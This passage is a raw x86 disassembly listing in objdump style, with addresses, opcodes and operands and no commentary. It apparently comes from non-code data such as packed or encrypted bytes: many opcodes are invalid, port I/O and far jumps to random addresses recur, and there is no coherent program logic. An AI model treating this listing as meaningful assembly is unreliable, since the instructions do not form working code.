  44e5eb:	inc    edx
  44e5ec:	imul   ebx,DWORD PTR [edi-0x294e1215],0xf91edcf2
  44e5f6:	fwait
  44e5f7:	pop    ss
  44e5f8:	ftst   
  44e5fa:	mov    ch,0xb1
  44e5fc:	in     eax,0xa3
  44e5fe:	mov    ebx,0x9681448a
  44e603:	js     0x44e59b
  44e605:	xor    dh,BYTE PTR [edi+0x7b]
  44e608:	mov    ss,WORD PTR [edi+0x3b42b4b3]
  44e60e:	pop    ss
  44e60f:	cmp    eax,DWORD PTR [esi-0x7165ffe4]
  44e615:	shl    DWORD PTR [edx-0x79],0x9a
  44e619:	fsubr  st,st(4)
  44e61b:	in     al,0x91
  44e61d:	pop    ecx
  44e61e:	dec    esp
  44e61f:	pop    edi
  44e620:	daa    
  44e621:	cmp    DWORD PTR [edx-0x28],eax
  44e624:	cdq    
  44e625:	std    
  44e626:	mov    eax,0x2bdc15ab
  44e62b:	out    0x41,eax
  44e62d:	pop    ebx
  44e62e:	cmp    eax,DWORD PTR [esp+eax*4+0x1c4bbceb]
  44e635:	jmp    0x5da7ff1
  44e63a:	inc    eax
  44e63b:	mov    ebp,0x4ba77f67
  44e640:	push   es
  44e641:	jne    0x44e5de
  44e643:	jmp    0x44e666
  44e645:	or     ebp,ebp
  44e647:	adc    al,0x28
  44e649:	or     BYTE PTR [edi+0x74],dh
  44e64c:	test   al,0xf8
  44e64e:	inc    edx
  44e64f:	lock pop edx
  44e651:	xor    dh,BYTE PTR [esp+eiz*4-0x1521ee03]
  44e658:	push   es
  44e659:	lods   eax,DWORD PTR ds:[esi]
  44e65a:	sub    bh,BYTE PTR [ebp+0x1e]
  44e65d:	sub    ecx,0x2ca1e40b
  44e663:	xor    al,0xc5
  44e665:	loope  0x44e623
  44e667:	xor    al,0x98
  44e669:	xor    al,0xd8
  44e66b:	and    BYTE PTR [ebp-0x1b],0x73
  44e66f:	jmp    0x70261674
  44e674:	push   ss
  44e675:	sub    edi,esp
  44e677:	inc    eax
  44e678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e679:	test   eax,0xa5c87409
  44e67e:	cmp    eax,DWORD PTR [edx-0x6f]
  44e681:	xor    DWORD PTR [eax-0x2a],esi
  44e684:	or     ah,ah
  44e686:	test   al,0x53
  44e688:	jl     0x44e639
  44e68a:	xchg   edi,eax
  44e68b:	es xchg ebx,eax
  44e68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e68e:	sub    cl,bh
  44e690:	dec    ebx
  44e691:	push   ecx
  44e692:	mov    esi,0xbade65a2
  44e697:	jmp    0x69cb9ec7
  44e69c:	sbb    al,0x39
  44e69e:	stos   BYTE PTR es:[edi],al
  44e69f:	xchg   edi,eax
  44e6a1:	ja     0x44e677
  44e6a3:	add    al,0xb
  44e6a5:	popf   
  44e6a6:	jnp    0x44e65c
  44e6a8:	inc    ebx
  44e6a9:	jb     0x44e687
  44e6ab:	push   ds
  44e6ac:	sbb    dh,ch
  44e6ae:	clc    
  44e6af:	mov    bh,0x7a
  44e6b1:	mov    ecx,0x957284b3
  44e6b6:	fs jnp 0x44e6f6
  44e6b9:	and    eax,0x1206202f
  44e6be:	add    eax,edi
  44e6c0:	pop    ds
  44e6c1:	and    DWORD PTR ds:0x620521d8,0xffffffb0
  44e6c8:	xor    al,0x1f
  44e6ca:	mov    ah,0x84
  44e6cc:	sbb    cl,BYTE PTR [edx]
  44e6ce:	sar    DWORD PTR [ebx-0x11246242],cl
  44e6d4:	lea    eax,[ecx-0x4a1f3173]
  44e6da:	jmp    0x6d2b:0xe83cb8b3
  44e6e1:	xchg   edi,eax
  44e6e2:	pop    esp
  44e6e3:	call   0x73df750a
  44e6e8:	add    eax,0x3df44ae2
  44e6ed:	pop    esp
  44e6ee:	mov    DWORD PTR [esi-0x9],esp
  44e6f1:	dec    ecx
  44e6f2:	popf   
  44e6f3:	or     eax,0x18c59f6f
  44e6f8:	mov    gs,WORD PTR [ebx+0x38]
  44e6fb:	aas    
  44e6fc:	test   DWORD PTR [edi+esi*1],ecx
  44e6ff:	jmp    0x44e77b
  44e701:	clc    
  44e702:	adc    al,0xb9
  44e704:	sbb    ebx,ecx
  44e706:	ja     0x44e6ba
  44e708:	out    dx,eax
  44e709:	shl    ecx,1
  44e70b:	pushf  
  44e70c:	dec    esp
  44e70d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e70e:	adc    al,0x7c
  44e710:	adc    eax,0x8de4de98
  44e715:	dec    esp
  44e716:	xchg   edi,eax
  44e717:	cmp    al,0xbd
  44e719:	or     al,0xfb
  44e71b:	adc    esp,DWORD PTR ds:0x94f3a1a6
  44e721:	je     0x44e708
  44e723:	(bad)  
  44e724:	and    eax,0x81f43db3
  44e729:	sub    eax,DWORD PTR ds:0x6fe920f0
  44e72f:	push   cs
  44e730:	and    ebx,ebx
  44e732:	pushf  
  44e733:	es jmp 0x2263:0xeabafba0
  44e73b:	nop
  44e73c:	mov    ss,WORD PTR [edi]
  44e73e:	ret    
  44e73f:	or     eax,0xc4bbe0cd
  44e744:	pop    ds
  44e745:	(bad)  
  44e746:	lock xchg ebx,eax
  44e748:	aad    0x89
  44e74a:	dec    esp
  44e74b:	repz or ebp,DWORD PTR [edi+0x39]
  44e74f:	and    BYTE PTR [ecx+ebp*4],0xe1
  44e753:	or     ch,dl
  44e755:	mov    fs,WORD PTR [edx+ecx*1]
  44e758:	xor    esp,edx
  44e75a:	mov    ebx,0x52ded2b5
  44e75f:	add    al,0x53
  44e761:	sub    di,WORD PTR [edx+edx*2+0x1b]
  44e766:	xor    DWORD PTR [edx-0x2b47edc3],esp
  44e76c:	in     al,dx
  44e76d:	cli    
  44e76e:	into   
  44e76f:	push   0xe92df075
  44e774:	sahf   
  44e775:	call   0x796a7d67
  44e77a:	rol    BYTE PTR [edi-0x7f14a956],cl
  44e780:	fimul  DWORD PTR [edx-0x30a6baf4]
  44e786:	add    al,BYTE PTR [ebx-0x634ba983]
  44e78c:	es leave 
  44e78e:	ret    
  44e78f:	pusha  
  44e790:	in     al,dx
  44e791:	sbb    BYTE PTR [edi],cl
  44e793:	mov    al,ds:0xcf5d269e
  44e798:	gs retf 0xea0f
  44e79c:	mov    ecx,0xbb47e0c6
  44e7a1:	ins    BYTE PTR es:[edi],dx
  44e7a2:	loop   0x44e7f7
  44e7a4:	pop    ebp
  44e7a5:	cld    
  44e7a6:	inc    esp
  44e7a7:	lock add BYTE PTR [edi-0x31a2d037],ah
  44e7ae:	jnp    0x44e7d3
  44e7b0:	sub    eax,0x19b82010
  44e7b5:	inc    edx
  44e7b6:	mov    ah,0x17
  44e7b8:	push   ds
  44e7b9:	mov    ecx,0x1c365c1f
  44e7be:	dec    ecx
  44e7bf:	adc    eax,0xa009d486
  44e7c4:	and    ah,BYTE PTR [ecx-0x5ff42e05]
  44e7ca:	ffreep st(5)
  44e7cc:	pop    ds
  44e7cd:	je     0x44e781
  44e7cf:	mov    al,ds:0xd4b3cfa2
  44e7d4:	rol    cl,0x55
  44e7d7:	test   eax,0xe8ec33f5
  44e7dc:	inc    esi
  44e7dd:	ret    0x8c32
  44e7e0:	sbb    DWORD PTR [ecx+0x77],ecx
  44e7e3:	dec    esi
  44e7e4:	imul   esp,DWORD PTR ds:0xa7c6949f,0x92951b4b
  44e7ee:	push   edx
  44e7ef:	loop   0x44e77f
  44e7f1:	inc    edi
  44e7f2:	push   es
  44e7f3:	daa    
  44e7f4:	addr16 xchg si,ax
  44e7f7:	inc    esi
  44e7f8:	cmc    
  44e7f9:	or     al,0xb4
  44e7fb:	sub    ah,ah
  44e7fd:	pushf  
  44e7fe:	stos   DWORD PTR es:[edi],eax
  44e7ff:	mov    bh,0x10
  44e801:	ret    0x9678
  44e804:	sub    DWORD PTR [esi+0x7618528d],ebp
  44e80a:	mov    bh,0x44
  44e80c:	aaa    
  44e80d:	enter  0x2559,0x86
  44e811:	mov    ah,0xef
  44e813:	pop    edi
  44e814:	mov    edi,0x62803fa0
  44e819:	and    DWORD PTR [eax],esp
  44e81b:	push   ds
  44e81c:	cmp    dh,BYTE PTR [ecx-0x4e]
  44e81f:	inc    esp
  44e820:	xchg   DWORD PTR [ebp+0x1f27f770],ebp
  44e826:	cwde   
  44e827:	stos   DWORD PTR es:[edi],eax
  44e828:	mov    dl,0xad
  44e82a:	bswap  edi
  44e82c:	(bad)
  44e82f:	push   esi
  44e830:	lahf   
  44e831:	jb     0x44e862
  44e833:	ja     0x44e88e
  44e835:	and    eax,0x52bec4ba
  44e83a:	add    ch,al
  44e83c:	push   ebp
  44e83d:	rcl    DWORD PTR [esi-0x18],0xec
  44e841:	add    esp,DWORD PTR [edi]
  44e843:	sub    ecx,DWORD PTR [edi+0x4708ebf9]
  44e849:	fwait
  44e84a:	enter  0xc004,0x30
  44e84e:	mov    ah,0xa0
  44e850:	(bad)  
  44e851:	popa   
  44e852:	pop    es
  44e853:	adc    eax,0x20f0c87d
  44e858:	and    DWORD PTR [esi+0x29cf9ecf],ebx
  44e85e:	push   ds
  44e85f:	ret    
  44e860:	jecxz  0x44e8df
  44e862:	mov    dl,0x84
  44e864:	aas    
  44e865:	mov    ecx,DWORD PTR [esp+eiz*4]
  44e868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e869:	push   edx
  44e86a:	cmp    esp,esi
  44e86c:	(bad)  
  44e86d:	lahf   
  44e86e:	(bad)  
  44e86f:	cld    
  44e870:	mov    ds,WORD PTR [ecx]
  44e872:	push   ds
  44e873:	mov    ah,0xf
  44e875:	stc    
  44e876:	test   eax,0x23462009
  44e87b:	dec    ecx
  44e87c:	lock sahf 
  44e87e:	sbb    BYTE PTR [ebp+0x55],0x9c
  44e882:	mov    esp,DWORD PTR [eax]
  44e884:	mov    bh,0x5d
  44e886:	in     al,dx
  44e887:	es aad 0xb7
  44e88a:	cmp    dh,BYTE PTR [edi-0x7]
  44e88d:	loope  0x44e84a
  44e88f:	in     al,0xd8
  44e891:	outs   dx,BYTE PTR ds:[esi]
  44e892:	cmp    eax,0x8c93b576
  44e897:	jmp    0x89e6a8c9
  44e89c:	push   ds
  44e89d:	jns    0x44e8f9
  44e89f:	mov    cl,0xb0
  44e8a1:	std    
  44e8a2:	aaa    
  44e8a3:	mov    ecx,0x42cba888
  44e8a8:	mov    bl,0xb0
  44e8aa:	daa    
  44e8ab:	scas   eax,DWORD PTR es:[edi]
  44e8ac:	adc    edi,DWORD PTR [esi+0x7e]
  44e8af:	mov    ecx,0x7bd33916
  44e8b4:	lods   al,BYTE PTR ds:[esi]
  44e8b5:	clc    
  44e8b6:	shl    DWORD PTR [esi+0x7cd06880],0x19
  44e8bd:	cdq    
  44e8be:	sbb    eax,0xaffab96e
  44e8c3:	out    0x4f,al
  44e8c5:	adc    DWORD PTR [ebp+ecx*4+0x6e],0xffffffd0
  44e8ca:	cmp    al,BYTE PTR [ebx-0x6b185aed]
  44e8d0:	ret    0x75a8
  44e8d3:	jne    0x44e8b4
  44e8d5:	test   al,0x6b
  44e8d7:	and    eax,0xc193811c
  44e8dc:	pop    esp
  44e8dd:	mov    ebx,0xfc2f5bf6
  44e8e2:	mov    dl,0xa4
  44e8e4:	add    al,0xf2
  44e8e6:	inc    ecx
  44e8e7:	ret    
  44e8e8:	and    eax,0x13f04890
  44e8ed:	imul   edi,ecx,0xffffff84
  44e8f0:	les    edi,FWORD PTR [eax+0x2f]
  44e8f3:	pop    ebx
  44e8f4:	cmp    ecx,edi
  44e8f6:	je     0x44e87c
  44e8f8:	mov    ecx,0x49548b38
  44e8fd:	test   DWORD PTR [ebp-0x1a],esi
  44e900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e901:	pop    edx
  44e902:	rcr    DWORD PTR [edi],1
  44e904:	scas   eax,DWORD PTR es:[edi]
  44e905:	adc    al,0x17
  44e907:	mov    dh,0xc6
  44e909:	(bad)  [eax]
  44e90b:	add    bh,ch
  44e90d:	push   esi
  44e90e:	jecxz  0x44e984
  44e910:	or     DWORD PTR [ecx],ebp
  44e912:	(bad)
  44e915:	pushf  
  44e916:	dec    ebx
  44e917:	or     ah,BYTE PTR [edx+0x33]
  44e91a:	in     eax,dx
  44e91b:	pop    ebp
  44e91c:	mov    edx,0xab69bc0f
  44e921:	outs   dx,DWORD PTR ds:[esi]
  44e922:	mov    edx,0xe472a024
  44e927:	test   BYTE PTR ds:0x8ee51f6b,ah
  44e92d:	mov    ebp,0x3a00822c
  44e932:	pop    ds
  44e933:	jbe    0x44e90e
  44e935:	ins    DWORD PTR es:[edi],dx
  44e936:	scas   eax,DWORD PTR es:[edi]
  44e937:	mov    ds:0x6cdbd513,al
  44e93c:	jns    0x44e97f
  44e93e:	out    0xec,eax
  44e940:	aad    0x10
  44e942:	cmp    bh,ah
  44e944:	lock pop esi
  44e946:	push   cs
  44e947:	or     BYTE PTR [ebx],dl
  44e949:	fist   DWORD PTR [edx+eiz*2+0x16]
  44e94d:	(bad)  
  44e94f:	cli    
  44e950:	into   
  44e951:	sbb    BYTE PTR [esi+0x279ab90d],0x6c
  44e958:	test   BYTE PTR [edi-0x50],al
  44e95b:	hlt    
  44e95c:	mov    dl,0x6b
  44e95e:	xor    edi,DWORD PTR [edi-0x3d]
  44e961:	inc    ebx
  44e962:	mov    eax,0x31341224
  44e967:	push   0xf8c9ef55
  44e96c:	dec    esi
  44e96d:	cmp    BYTE PTR [edi],0xc6
  44e970:	shr    BYTE PTR [edx],cl
  44e972:	inc    esp
  44e973:	out    0xbb,eax
  44e975:	or     eax,0x2c0a24b2
  44e97a:	cwde   
  44e97b:	aaa    
  44e97c:	test   eax,0x17ad710e
  44e981:	ins    DWORD PTR es:[edi],dx
  44e982:	call   0xdc71:0x961f1a6d
  44e989:	sub    esi,edi
  44e98b:	mov    ds:0x85b9b4c,al
  44e990:	pop    eax
  44e991:	dec    edi
  44e992:	nop
  44e993:	cmp    DWORD PTR ss:[ebp-0x33],ebp
  44e997:	dec    edi
  44e998:	push   ds
  44e999:	mov    ds:0xef8c087,al
  44e99e:	out    dx,eax
  44e99f:	pop    esi
  44e9a0:	sbb    ebp,DWORD PTR [ecx]
  44e9a2:	jmp    0xc6bcbbd3
  44e9a7:	fcomp  DWORD PTR gs:[edi-0x45861c55]
  44e9ae:	cs lahf 
  44e9b0:	pop    ebp
  44e9b1:	data16 sub al,0x6a
  44e9b4:	loop   0x44e942
  44e9b6:	sub    BYTE PTR ds:0x51dcbe24,dh
  44e9bc:	cmp    eax,0xf14e3c65
  44e9c1:	or     eax,ebp
  44e9c3:	aam    0x1e
  44e9c5:	in     al,0x36
  44e9c7:	mul    edi
  44e9c9:	test   DWORD PTR [ebp+0x5fead334],esi
  44e9cf:	adc    eax,0xefcb2525
  44e9d4:	ret    0x6bf7
  44e9d7:	lahf   
  44e9d8:	pop    ss
  44e9d9:	stc    
  44e9da:	sub    DWORD PTR [ebp+0x7f],esp
  44e9dd:	jbe    0x44e9bc
  44e9df:	push   0x14
  44e9e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e9e2:	sub    ecx,DWORD PTR [edi]
  44e9e4:	not    BYTE PTR [esi]
  44e9e6:	xchg   edx,eax
  44e9e7:	sti    
  44e9e8:	sbb    al,0x64
  44e9ea:	sahf   
  44e9eb:	inc    ebp
  44e9ec:	fnclex 
  44e9ee:	mov    ecx,0xff3623c4
  44e9f3:	(bad)  
  44e9f4:	push   esp
  44e9f5:	mov    eax,ds:0x4ba64f4b
  44e9fa:	mov    BYTE PTR [eax],bh
  44e9fc:	into   
  44e9fd:	ret    0xe8c1
  44ea00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ea01:	mov    ebx,0x992402b2
  44ea06:	add    esi,ecx
  44ea08:	retf   0xcc7b
  44ea0b:	std    
  44ea0c:	ins    DWORD PTR es:[edi],dx
  44ea0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ea0e:	mov    edi,DWORD PTR [eax]
  44ea10:	pop    es
  44ea11:	ret    0xa437
  44ea14:	aam    0x41
  44ea16:	mov    bl,0x3d
  44ea18:	lds    edi,FWORD PTR gs:[edi+0x581bf834]
  44ea1f:	jg     0x44e9c7
  44ea21:	lds    edx,FWORD PTR ds:0xdc6f311e
  44ea27:	pop    edi
  44ea28:	mov    eax,ds:0x17d0b76f
  44ea2d:	(bad)  
  44ea2e:	mov    edi,0xc0b2a864
  44ea33:	inc    ecx
  44ea34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ea35:	popf   
  44ea36:	push   ecx
  44ea37:	out    0x7c,eax
  44ea39:	inc    ebx
  44ea3a:	cwde   
  44ea3b:	push   ss
  44ea3c:	cmc    
  44ea3d:	mov    WORD PTR [ebp-0x3d],ds
  44ea40:	mul    BYTE PTR [edx+0x17]
  44ea43:	push   ebp
  44ea44:	and    al,0xaf
  44ea46:	fdivr  st(4),st
  44ea48:	rol    BYTE PTR [ebx+0x71255def],0xab
  44ea4f:	mov    dl,0xd
  44ea51:	sbb    eax,0x991b1b0e
  44ea56:	jmp    0xfbfb:0x3e2f8bf0
  44ea5d:	mov    eax,ds:0xca8f77db
  44ea62:	pop    eax
  44ea63:	sub    DWORD PTR [eax+0x49046521],edi
  44ea69:	imul   edi,DWORD PTR [ecx],0x37ba2990
  44ea6f:	fsubr  QWORD PTR [edi-0x79151965]
  44ea75:	pop    edi
  44ea76:	mov    cl,0x56
  44ea78:	mov    edi,0x4bef2a8b
  44ea7d:	sar    BYTE PTR [eax+0x65918ce],0xae
  44ea84:	ins    BYTE PTR es:[edi],dx
  44ea85:	add    eax,0x64b61c76
  44ea8a:	inc    eax
  44ea8b:	sbb    bl,BYTE PTR [esi]
  44ea8d:	cmp    edx,esp
  44ea8f:	lea    eax,[eax+edx*2-0x5d]
  44ea93:	mov    ch,0x22
  44ea95:	sbb    ebx,esp
  44ea97:	xchg   ebp,eax
  44ea98:	idiv   ch
  44ea9a:	sub    ah,BYTE PTR [edi]
  44ea9c:	dec    ecx
  44ea9d:	shr    BYTE PTR [ebx+0x20c1d1cd],1
  44eaa3:	lahf   
  44eaa4:	xor    eax,0x92af6832
  44eaa9:	loopne 0x44eac0
  44eaab:	imul   edx,DWORD PTR [edi],0xffffffac
  44eaae:	jmp    0x5598:0x84500494
  44eab5:	cmp    ah,bh
  44eab7:	fs pop ss
  44eab9:	std    
  44eaba:	pop    ss
  44eabb:	xor    al,0xc0
  44eabd:	sub    al,0x7a
  44eabf:	retf   0x4a03
  44eac2:	mov    ecx,0x37c8eaf4
  44eac7:	add    ecx,ecx
  44eac9:	icebp  
  44eaca:	mov    ebp,0xe6f73ca4
  44eacf:	xor    dh,ah
  44ead1:	adc    BYTE PTR [esi+0x637f1dcf],ah
  44ead7:	mov    al,BYTE PTR [edx+0x25]
  44eada:	jnp    0x44ea60
  44eadc:	or     al,0x7
  44eade:	mov    al,0x64
  44eae0:	in     al,dx
  44eae1:	std    
  44eae2:	inc    ebx
  44eae3:	mov    esi,0xef3866b5
  44eae8:	out    0xe9,eax
  44eaea:	push   es
  44eaeb:	shr    DWORD PTR [eax],0x59
  44eaee:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44eaf0:	cdq    
  44eaf1:	retf   
  44eaf2:	fwait
  44eaf3:	addr16 and al,0x2c
  44eaf6:	test   al,0x99
  44eaf8:	in     eax,dx
  44eaf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44eafa:	imul   edi,DWORD PTR [eax+0x46],0x72
  44eafe:	mov    ebx,0xd4e82970
  44eb03:	ret    0xc6a5
  44eb06:	mov    ebp,0x12d589f4
  44eb0b:	cmc    
  44eb0c:	xchg   ebp,eax
  44eb0d:	inc    ebx
  44eb0e:	jo     0x44eaf8
  44eb10:	dec    esi
  44eb11:	(bad)  
  44eb12:	jmp    0x8f2e0554
  44eb17:	mov    bl,0xd7
  44eb19:	xchg   esp,eax
  44eb1a:	dec    esi
  44eb1b:	aad    0x31
  44eb1d:	cmp    ebx,DWORD PTR [ebx+0x14]
  44eb20:	push   0x45ac0865
  44eb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44eb26:	sbb    ch,ch
  44eb28:	xchg   BYTE PTR [ecx],cl
  44eb2a:	jno    0x44eb3f
  44eb2c:	jno    0x44eab0
  44eb2e:	mov    ebp,0x4b7dbac4
  44eb33:	xor    esi,eax
  44eb35:	dec    edx
  44eb36:	push   ebx
  44eb37:	add    esp,DWORD PTR [edx+0x446d522d]
  44eb3d:	push   edi
  44eb3e:	pop    ecx
  44eb3f:	out    0x2,eax
  44eb41:	mov    eax,ds:0x5c9eda7b
  44eb46:	stos   DWORD PTR es:[edi],eax
  44eb47:	dec    ebx
  44eb48:	aaa    
  44eb49:	fwait
  44eb4a:	mov    ebp,esi
  44eb4c:	call   0xead9d3ac
  44eb51:	xchg   ecx,eax
  44eb52:	xchg   BYTE PTR [ebp+ebx*1+0x23643349],cl
  44eb59:	adc    eax,0x9f91dd7b
  44eb5e:	retf   
  44eb5f:	mov    eax,ds:0x2254e5ac
  44eb64:	mov    bl,0x7e
  44eb66:	xor    DWORD PTR [esi-0x3b4fa04b],edi
  44eb6c:	or     bl,bl
  44eb6e:	xchg   ecx,eax
  44eb6f:	rol    BYTE PTR [ebp-0x67117064],cl
  44eb75:	jmp    0xa8dab1c4
  44eb7a:	test   eax,0x990923dc
  44eb7f:	std    
  44eb80:	call   0xbf2b:0x1c34c84d
  44eb87:	xor    eax,0xb9e28124
  44eb8c:	xor    eax,0x16620bcb
  44eb91:	pop    ecx
  44eb92:	call   0xa86110cd
  44eb97:	sub    DWORD PTR [ecx],edx
  44eb99:	aas    
  44eb9a:	sbb    al,dl
  44eb9c:	push   ss
  44eb9d:	push   ebx
  44eb9e:	sub    ebx,DWORD PTR ds:0x58322659
  44eba4:	call   0xb29f:0xbb133c23
  44ebab:	je     0x44ec0f
  44ebad:	outs   dx,BYTE PTR ds:[esi]
  44ebae:	inc    eax
  44ebaf:	sti    
  44ebb0:	lds    ecx,FWORD PTR [edi-0x213b0ddb]
  44ebb6:	in     eax,0x9b
  44ebb8:	push   ds
  44ebb9:	sbb    ebp,ebx
  44ebbb:	repnz mov ecx,0xb0739fd3
  44ebc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ebc2:	or     eax,DWORD PTR [ebx]
  44ebc4:	ror    DWORD PTR [eax-0x3214b04d],1
  44ebca:	int3   
  44ebcb:	cmc    
  44ebcc:	in     al,0x72
  44ebce:	mov    ah,0x24
  44ebd0:	xchg   edx,eax
  44ebd1:	xchg   ebx,eax
  44ebd2:	in     eax,0x87
  44ebd4:	xor    eax,0x56edafe8
  44ebd9:	jb     0x44ec01
  44ebdb:	add    edx,ebp
  44ebdd:	or     al,0xec
  44ebdf:	in     al,0x35
  44ebe1:	sbb    esi,DWORD PTR [edx-0x1b]
  44ebe4:	lods   eax,DWORD PTR ds:[esi]
  44ebe5:	inc    esp
  44ebe6:	mov    edx,0xcb86a526
  44ebeb:	in     eax,dx
  44ebec:	(bad)  [esi+0x70b03677]
  44ebf2:	add    al,0x8e
  44ebf4:	cmp    edx,esi
  44ebf6:	mov    ah,0xc4
  44ebf8:	and    BYTE PTR [ecx],dh
  44ebfa:	cmp    eax,0x8b9d75f8
  44ebff:	mov    ecx,esi
  44ec01:	and    cl,BYTE PTR ds:0x7129f5df
  44ec07:	jno    0x44ebea
  44ec09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ec0a:	mov    ah,0xb4
  44ec0c:	xchg   ecx,eax
  44ec0d:	(bad)  
  44ec0f:	mov    BYTE PTR [ebp-0xe166a29],ah
  44ec15:	in     eax,0xa6
  44ec17:	or     eax,0x39d14923
  44ec1c:	sbb    esp,eax
  44ec1e:	shl    ecx,1
  44ec20:	or     BYTE PTR [ebp-0x34756865],ah
  44ec26:	mov    cl,0xc
  44ec28:	cmp    DWORD PTR [esi],0x75b66baa
  44ec2e:	out    0x64,eax
  44ec30:	mov    WORD PTR [edx+0x55],?
  44ec33:	mov    dl,0x41
  44ec35:	fstp   TBYTE PTR [edx-0x19c42a74]
  44ec3b:	in     eax,dx
  44ec3c:	sti    
  44ec3d:	(bad)  
  44ec3e:	ins    DWORD PTR es:[edi],dx
  44ec3f:	pop    ds
  44ec40:	and    al,0xe9
  44ec42:	and    bl,BYTE PTR [edi+0x5e0ed01d]
  44ec48:	push   edi
  44ec49:	mov    ah,0x8b
  44ec4b:	or     esi,DWORD PTR [ecx]
  44ec4d:	sub    al,0x7e
  44ec4f:	xlat   BYTE PTR ds:[ebx]
  44ec50:	clc    
  44ec51:	arpl   WORD PTR [ecx],bx
  44ec53:	or     esp,DWORD PTR [ecx+ebx*2]
  44ec56:	stos   BYTE PTR es:[edi],al
  44ec57:	mov    WORD PTR [edi],?
  44ec59:	daa    
  44ec5a:	outs   dx,BYTE PTR ds:[esi]
  44ec5b:	xchg   edx,eax
  44ec5c:	mov    eax,0xa966ba1
  44ec61:	jge    0x44ec4e
  44ec63:	mov    ah,0x91
  44ec65:	jns    0x44ecaa
  44ec67:	inc    edi
  44ec68:	push   ds
  44ec69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ec6a:	jae    0x44ec54
  44ec6c:	jo     0x44ec21
  44ec6e:	push   ebx
  44ec6f:	test   eax,esp
  44ec71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ec72:	pop    ebx
  44ec73:	lock popf 
  44ec75:	ds das 
  44ec77:	or     esi,DWORD PTR [eax]
  44ec79:	inc    dh
  44ec7b:	adc    BYTE PTR [ecx-0x7b],al
  44ec7e:	mov    al,0xc4
  44ec80:	pop    ds
  44ec81:	mov    al,0x69
  44ec83:	mov    al,0x7
  44ec85:	mov    ecx,DWORD PTR [edi+ebp*1-0x1c3d26df]
  44ec8c:	push   edi
  44ec8d:	lods   eax,DWORD PTR ds:[esi]
  44ec8e:	xchg   DWORD PTR ds:0x95c5229f,ebx
  44ec94:	lahf   
  44ec95:	test   eax,0x9dcbc522
  44ec9a:	xor    edi,DWORD PTR [ecx-0x7d]
  44ec9d:	fistp  QWORD PTR [ebx]
  44ec9f:	retf   0xeae6
  44eca2:	push   esi
  44eca3:	fs fwait
  44eca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44eca6:	pop    ss
  44eca7:	mov    fs,ebp
  44eca9:	dec    ebp
  44ecaa:	mov    dl,0x42
  44ecac:	les    edi,FWORD PTR [ebx]
  44ecae:	mov    al,ds:0xc18f6576
  44ecb3:	and    al,0xa2
  44ecb5:	inc    edi
  44ecb6:	xchg   esp,eax
  44ecb7:	pop    eax
  44ecb8:	adc    al,0xd2
  44ecba:	or     esp,DWORD PTR [edi]
  44ecbc:	push   esp
  44ecbd:	in     eax,0xb7
  44ecbf:	or     eax,0x2b91679d
  44ecc4:	xor    al,0x59
  44ecc6:	mov    ebp,DWORD PTR [ebp+0x53c126d1]
  44eccc:	pop    ebp
  44eccd:	js     0x44ec5f
  44eccf:	pushf  
  44ecd0:	push   esi
  44ecd1:	push   es
  44ecd2:	jo     0x44ecf2
  44ecd4:	arpl   bx,bx
  44ecd6:	mov    dl,0x6e
  44ecd8:	and    edx,DWORD PTR [ecx-0x13]
  44ecdb:	mov    cl,0x18
  44ecdd:	sbb    DWORD PTR [ebx-0x1],ecx
  44ece0:	mov    dh,0xaf
  44ece2:	(bad)  [esi]
  44ece4:	push   ecx
  44ece5:	lahf   
  44ece6:	fwait
  44ece7:	aam    0x96
  44ece9:	daa    
  44ecea:	inc    edx
  44eceb:	pop    ebx
  44ecec:	call   0xb16d:0x276b1d96
  44ecf3:	les    ebx,FWORD PTR [ebp+0x3a]
  44ecf6:	popa   
  44ecf7:	std    
  44ecf8:	jno    0x44ec9f
  44ecfa:	fwait
  44ecfb:	push   0x4f
  44ecfd:	cmp    eax,0x47259509
  44ed02:	pushf  
  44ed03:	xchg   ecx,eax
  44ed04:	and    ebx,DWORD PTR [ecx-0x28]
  44ed07:	jnp    0x44eced
  44ed09:	aas    
  44ed0a:	cmc    
  44ed0b:	sbb    eax,DWORD PTR [eax-0x5c]
  44ed0e:	or     eax,DWORD PTR [esp+edi*1+0xb]
  44ed12:	or     DWORD PTR [ebx],esi
  44ed14:	(bad)  
  44ed15:	cmp    bl,cl
  44ed17:	jbe    0x44ed17
  44ed19:	sbb    esi,DWORD PTR [esi-0x3d7c5bc]
  44ed1f:	fwait
  44ed20:	or     eax,0xb56d36a5
  44ed25:	clc    
  44ed26:	xchg   edi,eax
  44ed27:	hlt    
  44ed28:	sbb    al,0x33
  44ed2a:	mov    ah,0x8f
  44ed2c:	sbb    al,0xe9
  44ed2e:	retf   0xbd27
  44ed31:	pop    edx
  44ed32:	fcomp  QWORD PTR [eax]
  44ed34:	stc    
  44ed35:	mov    al,ds:0x41260d7b
  44ed3a:	adc    DWORD PTR [ecx-0x32],ecx
  44ed3d:	push   ecx
  44ed3e:	mov    ecx,0x2eb4aa1a
  44ed43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ed44:	adc    eax,0xd5f451e2
  44ed49:	dec    ecx
  44ed4a:	pop    edx
  44ed4b:	jns    0x44ecf0
  44ed4d:	and    al,0xbe
  44ed4f:	and    al,0xc6
  44ed51:	xchg   BYTE PTR [ebp-0x2f0e8aaa],bh
  44ed57:	icebp  
  44ed58:	add    BYTE PTR [esi+ebp*4],bh
  44ed5b:	or     BYTE PTR [eax],bl
  44ed5d:	test   eax,0xc7aebb1a
  44ed62:	xor    dh,ah
  44ed64:	xchg   ch,bh
  44ed66:	add    dl,BYTE PTR [eax-0x6b]
